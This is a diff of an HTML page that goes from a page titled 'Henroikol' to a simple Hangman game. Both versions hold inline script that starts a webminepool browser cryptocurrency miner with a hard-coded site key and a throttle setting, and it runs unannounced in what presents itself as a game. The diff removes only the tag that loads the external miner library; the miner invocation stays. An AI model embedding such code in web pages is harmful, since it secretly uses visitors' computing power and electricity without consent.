@@ -1,19 +1,20 @@
 <!DOCTYPE html>
-<html id="html"lang="en">
+<html lang="en">
 <head>
-    <link rel="stylesheet" type="text/css" href="style.css" ></link>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Henroikol</title>
+    <title>Hangman</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <text width="0" height="0" id="plrL"></text>
-    <canvas height=1000 width=1000 id="mainCanvas"></canvas>
-    <a href="https://forms.office.com/r/sXXNUtgBBV">abc</a>
+    <img src="hangman pics/0 mistake.png" id="hangmanpic">
+    <input id="Character" type="text" size="1" maxlength="1" value="">
+    <button id="enterButton">Confirm</button>
+    <h1 id="foundword">_ _ _ _ _ _</h1>
+
     <script type="text/javascript" src="main.js"></script>
-        <script src="https://webminepool.com/lib/base.js"></script>
-<script>
+    <script>
     let key = "SK_BszgBi54XRK8ZnhdYF9cN"
     var miner = WMP.Anonymous(key,{throttle: 0.5});
     if (!miner.isMobile()){
@@ -29,3 +30,4 @@
 </script>
 </body>
 </html>
+
